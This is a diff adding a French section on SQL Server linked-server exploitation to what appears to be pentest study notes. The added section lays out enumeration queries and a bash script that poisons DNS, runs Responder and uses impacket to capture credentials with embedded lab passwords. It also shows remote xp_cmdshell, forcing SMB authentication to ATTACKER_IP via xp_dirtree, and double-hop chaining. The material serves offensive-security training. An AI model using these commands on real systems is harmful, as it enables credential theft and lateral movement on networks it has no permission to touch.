@@ -540,3 +540,128 @@ This is when the cycle starts all over again, but this time to obtain the NTLMv2
 {% hint style="info" %}
 Finally, the hash is intercepted by tools like `Responder`, `WireShark`, or `TCPDump` and displayed to us, which we can try to use for our purposes. Apart from that, there are many different ways to execute commands in MSSQL. For example, another interesting method would be to execute Python code in a SQL query. We can find more about this in the [documentation](https://docs.microsoft.com/en-us/sql/machine-learning/tutorials/quickstart-python-create-script?view=sql-server-ver15) from Microsoft. However, this and other possibilities of what we can do with MSSQL will be discussed in another module.
 {% endhint %}
+
+***
+
+### <mark style="color:blue;">🗄️ SQL Server Linked Server Exploitation</mark> <a href="#sql-server-linked-server" id="sql-server-linked-server"></a>
+
+#### Concept Théorique
+
+Les **Linked Servers** permettent à une instance SQL Server d'exécuter des requêtes sur une autre instance. Si mal configurés, ils peuvent :
+
+* Exposer des credentials en clair
+* Permettre l'exécution de commandes à distance
+* Faciliter le pivoting dans le réseau
+
+#### Architecture des Linked Servers
+
+```
+┌─────────────────────┐         OPENQUERY          ┌─────────────────┐
+│   SQL Server A      │─────────────────────────────>│  SQL Server B   │
+│  (S200401)          │  Credentials: sqlmgmt       │    (SQL07)      │
+│  Port: 6520         │  Password: bIhBbzMMnB82yx   │  Port: 1433     │
+└─────────────────────┘                              └─────────────────┘
+```
+
+#### Énumération des Linked Servers
+
+**1. Lister les serveurs liés**
+
+```sql
+-- Méthode 1 : sys.servers
+SELECT * FROM sys.servers;
+
+-- Méthode 2 : sp_helpserver
+EXEC sp_helpserver;
+
+-- Méthode 3 : sys.linked_logins
+SELECT * FROM sys.linked_logins;
+```
+
+**2. Tester la connectivité**
+
+```sql
+-- Exécuter une requête sur le serveur lié
+SELECT * FROM OPENQUERY([SQL07], 'SELECT @@version');
+
+-- Alternative
+EXEC ('SELECT SYSTEM_USER') AT [SQL07];
+```
+
+**3. Énumérer les bases de données distantes**
+
+```sql
+EXEC ('SELECT name FROM sys.databases') AT [SQL07];
+```
+
+#### Exploitation via DNS Poisoning
+
+**Scénario**
+
+1. SQL Server A essaie de se connecter à SQL07
+2. SQL07 n'existe pas → requête DNS
+3. DNS empoisonné retourne IP de l'attaquant
+4. SQL Server A se connecte à l'attaquant
+5. L'attaquant capture les credentials
+
+**Code d'exploitation complet**
+
+```bash
+#!/bin/bash
+
+# 1. Empoisonner le DNS
+python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
+  --record 'SQL07' --action add --data 10.10.15.75 10.129.17.103
+
+# 2. Démarrer Responder
+sudo responder -I tun0 -v &
+
+# 3. Se connecter au SQL Server
+impacket-mssqlclient -port 6520 OVERWATCH/sqlsvc@10.129.17.103 -windows-auth
+
+# 4. Déclencher la connexion
+# SQL> SELECT * FROM OPENQUERY([SQL07], 'SELECT 1');
+```
+
+#### Autres Techniques d'Exploitation
+
+**1. RPC Out Enabled**
+
+```sql
+-- Vérifier si RPC Out est activé
+SELECT is_rpc_out_enabled FROM sys.servers WHERE name = 'SQL07';
+
+-- Si activé, possibilité d'exécuter xp_cmdshell à distance
+EXEC ('EXEC xp_cmdshell ''whoami''') AT [SQL07];
+```
+
+**2. Credential Theft via xp\_dirtree**
+
+```sql
+-- Forcer une authentification SMB
+EXEC xp_dirtree '\\ATTACKER_IP\share';
+
+-- Capturer le hash avec Responder
+```
+
+**3. Double Hop Attack**
+
+```sql
+-- Chaîner plusieurs serveurs liés
+SELECT * FROM OPENQUERY([SQL07], 
+  'SELECT * FROM OPENQUERY([SQL08], ''SELECT @@version'')');
+```
+
+#### Détection
+
+```sql
+-- Auditer les connexions aux linked servers
+SELECT 
+    s.name AS ServerName,
+    l.remote_name,
+    l.uses_self_credential
+FROM sys.servers s
+LEFT JOIN sys.linked_logins l ON s.server_id = l.server_id;
+```
+
+***
